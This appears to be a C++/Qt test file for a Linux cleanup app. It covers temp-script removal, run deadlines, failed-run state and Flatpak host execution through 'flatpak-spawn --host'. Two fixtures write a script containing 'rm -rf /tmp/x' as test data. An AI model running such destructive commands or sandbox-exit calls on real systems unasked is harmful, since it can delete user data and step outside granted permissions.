/// lines the run just carried out, under a temp name the user cannot guess. A
/// removal that does not land has to be reported and the path kept, or the
/// window tells the user the run is over while an executable it produced is
/// still on disk with nothing pointing at it.
static int checkScriptFileRemoval() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "script removal: temp dir failed\n");
        return 1;
    }
    const QString file = tmp.filePath(QStringLiteral("run.sh"));
    QString keep;
    if (QFile::exists(file)) {
        std::fprintf(stderr, "script removal: temp file already exists\n");
        return 1;
    }
    if (writeFile(file, QByteArray("#!/bin/sh\nrm -rf /tmp/x\n"))) {
        std::fprintf(stderr, "script removal: write failed\n");
        return 1;
    }
    if (!removeScriptFile(file, keep) || !keep.isEmpty() || QFile::exists(file)) {
        std::fprintf(stderr, "script removal: a file that was there did not go\n");
        return 1;
    }
    // A file that is not there is the state the delete wanted, so a removal
    // raced by something else cannot report a failure.
    if (!removeScriptFile(file, keep)) {
        std::fprintf(stderr, "script removal: a missing file reported a failure\n");
        return 1;
    }
    // Nothing to remove is not a removal that failed either.
    if (!removeScriptFile(QString(), keep) || !keep.isEmpty()) {
        std::fprintf(stderr, "script removal: an empty path reported a failure\n");
        return 1;
    }
    /* The survivor case: the removal does not land and the caller is told
       which one, so the destructor has something to try again with and the
       user has a path to delete by hand. A non-empty directory stands in for
       the survivor: `QFile::remove` on a directory never unlinks it, and
       unlike a read-only parent directory it fails the same way for root and
       for an ordinary account, so this check does not decide who ran it. The
       permissions case is the one that reaches a user, and it is the same
       branch, so covering it here covers both. */
    const QString dir = tmp.filePath(QStringLiteral("stuck"));
    if (!QDir().mkpath(dir)) {
        std::fprintf(stderr, "script removal: could not make the stuck dir\n");
        return 1;
    }
    const QString occupant = dir + QStringLiteral("/run.sh");
    if (writeFile(occupant, QByteArray("#!/bin/sh\nrm -rf /tmp/x\n"))) {
        std::fprintf(stderr, "script removal: write failed\n");
        return 1;
    }
    keep.clear();
    if (removeScriptFile(dir, keep) || keep != dir) {
        std::fprintf(stderr, "script removal: a survivor was not reported and named\n");
        return 1;
    }
    if (!QFileInfo::exists(dir)) {
        std::fprintf(stderr, "script removal: the survivor is not on disk\n");
        return 1;
    }
    std::fprintf(stdout, "script removal: ok\n");
    return 0;
}

/// A real run through ScriptProcess: the temp file the runner writes must be
/// gone once the script has finished, and the runner must not report one left
/// behind. The removal that did not land is pinned above against a path that
/// cannot be unlinked; this is the other end of the same contract, that a
/// removal which does land leaves nothing to report and nothing for the
/// destructor to try again. Both halves matter: the first is what stops an
/// executable full of rm lines surviving, this is what stops the run from
/// claiming a leftover it does not have.
static int checkScriptRunCleansUpItsFile() {
    ScriptProcess proc;
    QString err;
    // `exit 0` with no commands: the test is about the temp file's lifetime,
    // not about what a script does.
    if (!proc.prepare(QStringLiteral("#!/bin/sh\nexit 0\n"), &err)) {
        std::fprintf(stderr, "script run: prepare failed (%s)\n", qPrintable(err));
        return 1;
    }
    const QString path = proc.scriptLeftBehind();
    if (path.isEmpty() || !QFile::exists(path)) {
        std::fprintf(stderr, "script run: the prepared script is not on disk\n");
        return 1;
    }
    QEventLoop loop;
    QObject::connect(&proc, &ScriptProcess::finished,
                     &loop, [&loop](int, bool, const QByteArray &) { loop.quit(); });
    proc.start();
    /* Bounded well under the runner's own kScriptTimeoutMs, so this check
       fails rather than waits out the deadline it is meant to sit inside. An
       `exit 0` script finishes in milliseconds, so anything near the
       production bound would only turn a regression into a hung test run. */
    QTimer deadline;
    QObject::connect(&deadline, &QTimer::timeout, &loop, &QEventLoop::quit);
    deadline.setSingleShot(true);
    deadline.start(30000);
    loop.exec();

    if (QFile::exists(path)) {
        std::fprintf(stderr, "script run: the script survived a finished run\n");
        return 1;
    }
    if (!proc.scriptLeftBehind().isEmpty()) {
        std::fprintf(stderr, "script run: a removed script is reported as left behind (%s)\n",
                     qPrintable(proc.scriptLeftBehind()));
        return 1;
    }
    std::fprintf(stdout, "script run: ok\n");
    return 0;
}

/// A run that reports `failed` is over, and the object says so. `start`'s
/// refusal of a sandboxed script it could not read reported it without saying
/// so: it stopped the deadline and emitted `failed`, and left `m_proc` set.
/// `running()` then answered true for a process that never started, `prepare`
/// refused every later run on that handle, and the run was never marked
/// reported, so a `finished` that did eventually arrive would have reported
/// the same run twice. The `FailedToStart` handler in `prepare` already did
/// all four steps; this pins that `start` does the same.
///
/// Driven by removing the prepared script, which is the same `QFile::open`
/// refusal a temp-directory cleaner produces, and needs no Flatpak: only the
/// script's own open is under test, not the `flatpak-spawn` above it.
static int checkScriptFailedRunIsOver() {
    /* Scoped, and restored before the one exit below: `start` only reads the
       script itself when FLATPAK_ID is set, and the checks around this one run
       real scripts through the host path, which a left-behind value would
       break. One exit rather than a guard per failure, so the restore cannot
       be the thing that is forgotten. */
    const QByteArray savedAppId = qgetenv("FLATPAK_ID");
    const bool hadAppId = qEnvironmentVariableIsSet("FLATPAK_ID");
    qputenv("FLATPAK_ID", "org.appattic.AppAttic");

    int rc = 0;
    do {
        ScriptProcess proc;
        QString err;
        if (!proc.prepare(QStringLiteral("#!/bin/sh\nexit 0\n"), &err)) {
            std::fprintf(stderr, "failed run: prepare failed (%s)\n", qPrintable(err));
            rc = 1;
            break;
        }
        if (!QFile::remove(proc.scriptLeftBehind())) {
            std::fprintf(stderr, "failed run: could not remove the prepared script\n");
            rc = 1;
            break;
        }

        bool failed = false;
        QObject::connect(&proc, &ScriptProcess::failed, [&failed] { failed = true; });
        proc.start();

        if (!failed) {
            std::fprintf(stderr,
                         "failed run: a script that cannot be read did not report failed\n");
            rc = 1;
            break;
        }
        if (proc.running()) {
            std::fprintf(stderr,
                         "failed run: running() is true after failed, and the next\n"
                         "           prepare is refused on a process that never started\n");
            rc = 1;
            break;
        }
        /* The refused run left nothing behind, and nothing blocks the next
           one: the object is reusable, which is what the window relies on when
           the user tries the same cleanup again. */
        QString err2;
        if (!proc.prepare(QStringLiteral("#!/bin/sh\nexit 0\n"), &err2)) {
            std::fprintf(stderr, "failed run: prepare after failed returned false (%s)\n",
                         qPrintable(err2));
            rc = 1;
            break;
        }
        const QString second = proc.scriptLeftBehind();
        if (second.isEmpty() || !QFile::exists(second)) {
            std::fprintf(stderr, "failed run: the next run has no script on disk\n");
            rc = 1;
            break;
        }
        /* Not started, so there is no run to stop and nothing would report it:
           the runner's destructor is what deletes a script that was prepared
           and never spawned, which is exactly the case this exercises. */
        QFile::remove(second);
    } while (false);

    if (hadAppId) {
        qputenv("FLATPAK_ID", savedAppId);
    } else {
        qunsetenv("FLATPAK_ID");
    }
    if (rc == 0) std::fprintf(stdout, "failed run: ok\n");
    return rc;
}

/// The run deadline counts the run, not the gap between preparing it and
/// starting it. `prepare` and `start` are separate so a caller can connect to
/// `finished` and `failed` before the process exists, and the production bound
/// is ten minutes: a timer armed in `prepare` charged that whole gap to the
/// script, and a prepared run that was never started was torn down by a
/// deadline that fired against no process at all. Both are pinned here with a
/// short bound, which is the only way to observe the deadline at all.
static int checkScriptDeadlineStartsAtSpawn() {
    /* Bounded well under the test's own wait, so a regression fails rather
       than hangs the suite. */
    const int kTestTimeoutMs = 900;
    ScriptProcess proc(kTestTimeoutMs);
    QString err;
    if (!proc.prepare(QStringLiteral("#!/bin/sh\nsleep 30\n"), &err)) {
        std::fprintf(stderr, "deadline: prepare failed (%s)\n", qPrintable(err));
        return 1;
    }
    if (proc.deadlineRemaining() != -1) {
        std::fprintf(stderr,
                     "deadline: a prepared run has %lld ms left; the budget is "
                     "armed before the process exists\n",
                     static_cast<long long>(proc.deadlineRemaining()));
        return 1;
    }
    /* Spin the event loop for longer than the bound. Nothing is running, so a
       deadline armed in `prepare` has fired and called `stop`, which is what
       this catches without having to read a QTimer that is not ours. */
    QEventLoop idle;
    QTimer::singleShot(kTestTimeoutMs * 2, &idle, &QEventLoop::quit);
    bool stopped = false;
    QObject::connect(&proc, &ScriptProcess::finished, &idle,
                     [&stopped](int, bool, const QByteArray &) { stopped = true; });
    idle.exec();
    if (stopped) {
        std::fprintf(stderr,
                     "deadline: an unstarted run was stopped by the deadline\n");
        return 1;
    }
    proc.start();
    /* A QTimer rounds up to its own tick, so the bound is generous rather than
       exact: what is pinned is that the budget is armed at all and is a whole
       run's worth, not a fragment left over from before `start`. */
    if (proc.deadlineRemaining() <= 0
        || proc.deadlineRemaining() > kTestTimeoutMs * 2) {
        std::fprintf(stderr,
                     "deadline: a started run reports %lld ms left, want (0, %d]\n",
                     static_cast<long long>(proc.deadlineRemaining()),
                     kTestTimeoutMs * 2);
        return 1;
    }
    /* And the deadline still stops a started run, which is the reason it is
       armed at all: a run that is not started is left alone, a run that is
       started and hangs is killed and reported. */
    QEventLoop loop;
    QObject::connect(&proc, &ScriptProcess::finished,
                     &loop, [&loop](int, bool, const QByteArray &) { loop.quit(); });
    QTimer cap;
    QObject::connect(&cap, &QTimer::timeout, &loop, &QEventLoop::quit);
    cap.setSingleShot(true);
    cap.start(kTestTimeoutMs * 4);
    loop.exec();
    if (proc.running()) {
        std::fprintf(stderr, "deadline: a started run outlived its bound\n");
        return 1;
    }
    const QString left = proc.scriptLeftBehind();
    if (!left.isEmpty()) {
        std::fprintf(stderr, "deadline: a stopped run left its script behind (%s)\n",
                     qPrintable(left));
        return 1;
    }
    std::fprintf(stdout, "deadline: ok\n");
    return 0;
}

/// A sandboxed run has to leave the Flatpak. The manifest grants
/// `--filesystem=host:ro` and no host write, and the script is written to the
/// sandbox temp directory, which the host cannot see, so a run that stayed
/// inside the sandbox both could not remove a packaged path and had a path the
/// host shell cannot open. This is a pure check of the command shape rather
/// than a real Flatpak, which CI has no reason to have: the boundary is the
/// contract, not the spawn. Both halves are pinned, because they are the same
/// defect seen from either side.
static int checkScriptLeavesTheSandbox() {
    const QString path = QStringLiteral("/tmp/appattic-abc123.sh");
    QString program;
    QStringList args;
    bool onStdin = false;

    scriptCommand(path, QStringLiteral("org.appattic.AppAttic"), &program, &args,
                  &onStdin);
    if (program != QLatin1String("flatpak-spawn")) {
        std::fprintf(stderr, "sandbox: run program is %s, want flatpak-spawn\n",
                     qPrintable(program));
        return 1;
    }
    if (args != (QStringList{QStringLiteral("--host"), QStringLiteral("--"),
                             QStringLiteral("/bin/sh")})) {
        std::fprintf(stderr, "sandbox: run args are [%s], want --host -- /bin/sh\n",
                     qPrintable(args.join(QLatin1Char(' '))));
        return 1;
    }
    if (!onStdin) {
        std::fprintf(stderr,
                     "sandbox: the script is passed by path, and the host cannot\n"
                     "         see a path in the sandbox temp directory\n");
        return 1;
    }
    // The sandboxed temp path must not appear in the host's argv at all: one
    // left in is the "No such file or directory" run.
    if (args.contains(path)) {
        std::fprintf(stderr, "sandbox: the host argv names the sandbox temp file %s\n",
                     qPrintable(path));
        return 1;
    }

    // A host run is unchanged: no flatpak-spawn, the path is the argument, and
    // stdin is not the script. Unset and blank FLATPAK_ID both mean a normal
    // host run, which is what `core/host/hostexec.c`'s `env_set` and
    // `corehost.cpp`'s `qEnvironmentVariableIsEmpty` already say. A blank one
    // read as sandboxed would send a host run through a `flatpak-spawn` that is
    // not installed, so it is pinned here rather than left to a trim that only
    // one of the three readers does.
    for (const QString &unset : {QString(), QStringLiteral(" "), QStringLiteral("\t")}) {
        scriptCommand(path, unset, &program, &args, &onStdin);
        if (program != QLatin1String("/bin/sh") || args != (QStringList{path}) || onStdin) {
            std::fprintf(stderr,
                         "sandbox: FLATPAK_ID=%s runs [%s] with args [%s], want "
                         "/bin/sh [%s] with the script by path\n",
                         qPrintable(unset), qPrintable(program),
                         qPrintable(args.join(QLatin1Char(' '))), qPrintable(path));
            return 1;
        }
    }
    if (!scriptRunsOnHost(QStringLiteral("org.appattic.AppAttic"))
        || scriptRunsOnHost(QString())
        || scriptRunsOnHost(QStringLiteral(" "))
        || scriptRunsOnHost(QStringLiteral("\t"))) {
        std::fprintf(stderr,
                     "sandbox: scriptRunsOnHost does not read a non-blank FLATPAK_ID\n");
        return 1;
    }
    std::fprintf(stdout, "sandbox: ok\n");
    return 0;
}

int main(int argc, char **argv) {
    /* QProcess and QTimer need a running event dispatcher, and
       checkScriptRunCleansUpItsFile() drives a real one. Constructed before
       the checks, and it lives to the end of main, so a ScriptProcess built
       inside a check still has one to deliver `finished` on. */
    QCoreApplication app(argc, argv);
    const int checks[] = {
        verifyHelpers(), checkPrivacy(), checkTiming(), checkDeferredFdBound(),
        checkRootDirDoneTotals(),
        checkDiskUsage(), checkScanWorkerToken(), checkScanCache(), checkSettings(),
        checkSettingsBackup(), checkSettingsBackupRepeatedSave(), checkDurableWrite(),
        checkDurableWriteNonASCIIPath(),
        checkSettingsRestore(),
        checkLocaleGrouping(), checkSizeLocaleDigits(),
        checkLegacySettingsMigration(), checkScriptFileRemoval(),
        checkScriptRunCleansUpItsFile(), checkScriptDeadlineStartsAtSpawn(),
        checkScriptFailedRunIsOver(),
        checkScriptLeavesTheSandbox(),
    };
    for (const int rc : checks) {
        if (rc != 0) return rc;
    }
    std::fprintf(stdout, "helpers: ok\n");
    return 0;
}
